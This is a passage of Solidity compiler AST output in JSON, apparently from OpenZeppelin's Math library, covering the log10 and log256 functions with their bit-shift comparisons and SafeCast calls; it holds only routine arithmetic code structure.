Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":3538,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"30414:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":3540,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30414:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3545,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3543,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"3130","id":3541,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30444:2:6","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"nodeType":"BinaryOperation","operator":"**","rightExpression":{"id":3542,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3530,"src":"30450:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"30444:12:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":3544,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3521,"src":"30459:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"30444:20:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"30414:50:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3536,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"30398:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3537,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"30407:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"30398:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3547,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30398:67:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"30389:76:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3528,"id":3549,"nodeType":"Return","src":"30382:83:6"}]}]},"documentation":{"id":3519,"nodeType":"StructuredDocumentation","src":"30076:143:6","text":" @dev Return the log in base 10, following the selected rounding direction, of a positive value.\n Returns 0 if given 0."},"id":3552,"implemented":true,"kind":"function","modifiers":[],"name":"log10","nameLocation":"30233:5:6","nodeType":"FunctionDefinition","parameters":{"id":3525,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3521,"mutability":"mutable","name":"value","nameLocation":"30247:5:6","nodeType":"VariableDeclaration","scope":3552,"src":"30239:13:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3520,"name":"uint256","nodeType":"ElementaryTypeName","src":"30239:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":3524,"mutability":"mutable","name":"rounding","nameLocation":"30263:8:6","nodeType":"VariableDeclaration","scope":3552,"src":"30254:17:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"},"typeName":{"id":3523,"nodeType":"UserDefinedTypeName","pathNode":{"id":3522,"name":"Rounding","nameLocations":["30254:8:6"],"nodeType":"IdentifierPath","referencedDeclaration":2077,"src":"30254:8:6"},"referencedDeclaration":2077,"src":"30254:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}},"visibility":"internal"}],"src":"30238:34:6"},"returnParameters":{"id":3528,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3527,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":3552,"src":"30296:7:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3526,"name":"uint256","nodeType":"ElementaryTypeName","src":"30296:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"30295:9:6"},"scope":3686,"src":"30224:258:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3628,"nodeType":"Block","src":"30800:675:6","statements":[{"expression":{"id":3569,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3560,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"30882:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3568,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3565,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3563,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3555,"src":"30902:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666666666666666666666666666666666666666666666666666666666666666","id":3564,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30906:34:6","typeDescriptions":{"typeIdentifier":"t_rational_340282366920938463463374607431768211455_by_1","typeString":"int_const 3402...(31 digits omitted)...1455"},"value":"0xffffffffffffffffffffffffffffffff"},"src":"30902:38:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3561,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"30886:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3562,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"30895:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"30886:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3566,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"30886:55:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"37","id":3567,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"30945:1:6","typeDescriptions":{"typeIdentifier":"t_rational_7_by_1","typeString":"int_const 7"},"value":"7"},"src":"30886:60:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"30882:64:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3570,"nodeType":"ExpressionStatement","src":"30882:64:6"},{"expression":{"id":3583,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3571,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31022:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3582,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3579,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3576,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3574,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3555,"src":"31044:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3575,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31049:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31044:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3577,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31043:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307866666666666666666666666666666666","id":3578,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31054:18:6","typeDescriptions":{"typeIdentifier":"t_rational_18446744073709551615_by_1","typeString":"int_const 18446744073709551615"},"value":"0xffffffffffffffff"},"src":"31043:29:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3572,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"31027:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3573,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"31036:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"31027:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3580,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31027:46:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"36","id":3581,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31077:1:6","typeDescriptions":{"typeIdentifier":"t_rational_6_by_1","typeString":"int_const 6"},"value":"6"},"src":"31027:51:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31022:56:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3584,"nodeType":"ExpressionStatement","src":"31022:56:6"},{"expression":{"id":3597,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3585,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31153:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3596,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3593,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3590,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3588,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3555,"src":"31175:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3589,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31180:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31175:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3591,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31174:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666666666666666","id":3592,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31185:10:6","typeDescriptions":{"typeIdentifier":"t_rational_4294967295_by_1","typeString":"int_const 4294967295"},"value":"0xffffffff"},"src":"31174:21:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3586,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"31158:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3587,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"31167:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"31158:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3594,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31158:38:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"35","id":3595,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31200:1:6","typeDescriptions":{"typeIdentifier":"t_rational_5_by_1","typeString":"int_const 5"},"value":"5"},"src":"31158:43:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31153:48:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3598,"nodeType":"ExpressionStatement","src":"31153:48:6"},{"expression":{"id":3611,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":3599,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31276:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"|=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3610,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3607,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3604,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3602,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3555,"src":"31298:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3603,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31303:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31298:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3605,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31297:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"307866666666","id":3606,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31308:6:6","typeDescriptions":{"typeIdentifier":"t_rational_65535_by_1","typeString":"int_const 65535"},"value":"0xffff"},"src":"31297:17:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3600,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"31281:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3601,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"31290:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"31281:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3608,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31281:34:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"34","id":3609,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31319:1:6","typeDescriptions":{"typeIdentifier":"t_rational_4_by_1","typeString":"int_const 4"},"value":"4"},"src":"31281:39:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31276:44:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":3612,"nodeType":"ExpressionStatement","src":"31276:44:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3626,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3615,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3613,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31426:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"hexValue":"33","id":3614,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31431:1:6","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"src":"31426:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3616,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31425:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"|","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3624,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3621,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3619,"name":"x","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3555,"src":"31453:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">>","rightExpression":{"id":3620,"name":"r","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3558,"src":"31458:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31453:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3622,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31452:8:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30786666","id":3623,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31463:4:6","typeDescriptions":{"typeIdentifier":"t_rational_255_by_1","typeString":"int_const 255"},"value":"0xff"},"src":"31452:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3617,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"31436:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3618,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"31445:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"31436:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":3625,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31436:32:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31425:43:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":3559,"id":3627,"nodeType":"Return","src":"31418:50:6"}]},"documentation":{"id":3553,"nodeType":"StructuredDocumentation","src":"30488:246:6","text":" @dev Return the log in base 256 of a positive value rounded towards zero.\n Returns 0 if given 0.\n Adding one to the result gives the number of pairs of hex symbols needed to represent `value` as a hex string."},"id":3629,"implemented":true,"kind":"function","modifiers":[],"name":"log256","nameLocation":"30748:6:6","nodeType":"FunctionDefinition","parameters":{"id":3556,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3555,"mutability":"mutable","name":"x","nameLocation":"30763:1:6","nodeType":"VariableDeclaration","scope":3629,"src":"30755:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3554,"name":"uint256","nodeType":"ElementaryTypeName","src":"30755:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"30754:11:6"},"returnParameters":{"id":3559,"nodeType":"ParameterList","parameters":[{"constant":false,"id":3558,"mutability":"mutable","name":"r","nameLocation":"30797:1:6","nodeType":"VariableDeclaration","scope":3629,"src":"30789:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3557,"name":"uint256","nodeType":"ElementaryTypeName","src":"30789:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"30788:11:6"},"scope":3686,"src":"30739:736:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":3665,"nodeType":"Block","src":"31712:184:6","statements":[{"id":3664,"nodeType":"UncheckedBlock","src":"31722:168:6","statements":[{"assignments":[3641],"declarations":[{"constant":false,"id":3641,"mutability":"mutable","name":"result","nameLocation":"31754:6:6","nodeType":"VariableDeclaration","scope":3664,"src":"31746:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":3640,"name":"uint256","nodeType":"ElementaryTypeName","src":"31746:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":3645,"initialValue":{"arguments":[{"id":3643,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3632,"src":"31770:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":3642,"name":"log256","nodeType":"Identifier","overloadedDeclarations":[3629,3666],"referencedDeclaration":3629,"src":"31763:6:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":3644,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31763:13:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"31746:30:6"},{"expression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3662,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3646,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3641,"src":"31797:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"arguments":[{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":3660,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":3650,"name":"rounding","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3635,"src":"31839:8:6","typeDescriptions":{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_enum$_Rounding_$2077","typeString":"enum Math.Rounding"}],"id":3649,"name":"unsignedRoundsUp","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3685,"src":"31822:16:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_enum$_Rounding_$2077_$returns$_t_bool_$","typeString":"function (enum Math.Rounding) pure returns (bool)"}},"id":3651,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"31822:26:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3659,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3657,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":3652,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31852:1:6","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"components":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":3655,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":3653,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3641,"src":"31858:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"33","id":3654,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"31868:1:6","typeDescriptions":{"typeIdentifier":"t_rational_3_by_1","typeString":"int_const 3"},"value":"3"},"src":"31858:11:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"id":3656,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"TupleExpression","src":"31857:13:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31852:18:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"id":3658,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3632,"src":"31873:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"31852:26:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"31822:56:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":3647,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"31806:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":3648,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"31815:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"31806:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns 